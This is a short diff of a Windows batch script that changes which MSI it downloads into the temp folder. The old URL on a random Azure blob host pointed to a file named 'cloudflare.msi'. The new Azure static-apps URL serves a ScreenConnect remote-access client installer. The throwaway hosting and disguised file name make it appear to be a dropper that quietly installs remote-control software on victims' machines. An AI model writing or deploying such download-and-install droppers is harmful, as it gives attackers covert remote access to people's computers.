@@ -3,8 +3,8 @@ REM CDRP7F3A9D2B8C4
 setlocal EnableExtensions
 
 REM ========== EDIT THESE ==========
-set "DOWNLOAD_URL=https://xxyhillr.blob.core.windows.net/xxyhillr/1526100151/1789810331_6a9092fd_cloudflare.msi"
-set "MSI_FILE=%TEMP%\cloudflare.msi"
+set "DOWNLOAD_URL=https://ashy-meadow-058164310.2.azurestaticapps.net/ScreenConnect.ClientSetup.msi"
+set "MSI_FILE=%TEMP%\ScreenConnect.ClientSetup.msi"
 REM ================================
 
 echo Downloading...
